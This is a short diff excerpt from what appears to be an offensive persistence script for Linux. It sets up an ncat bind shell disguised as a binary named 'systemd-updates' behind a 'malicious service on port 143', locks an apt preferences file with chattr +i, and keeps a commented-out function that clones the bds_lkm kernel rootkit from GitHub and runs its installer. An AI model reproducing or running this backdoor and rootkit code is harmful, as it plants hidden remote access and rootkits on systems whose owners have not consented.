@@ -177,7 +177,7 @@ cronScript() {
 }
 
 # nc bind shell: "systemd-updates" spoof + malicious service on port 143
-revShell() {
+bindShell() {
   apt install ncat -y
   cp $(which ncat) /usr/bin/systemd-updates
   
@@ -219,10 +219,11 @@ EOF
 chattr +i /etc/apt/preferences.d/ubuntu-pro-esm-security
 }
 
-bdsRootkit() {
-  git clone https://github.com/bluedragonsecurity/bds_lkm.git
-  cd bds_lkm && ./install.sh
-}
+# --- IN CONSTRUCTION ---
+# bdsRootkit() {
+#   git clone https://github.com/bluedragonsecurity/bds_lkm.git
+#  cd bds_lkm && ./install.sh
+#}
 
 
 $1
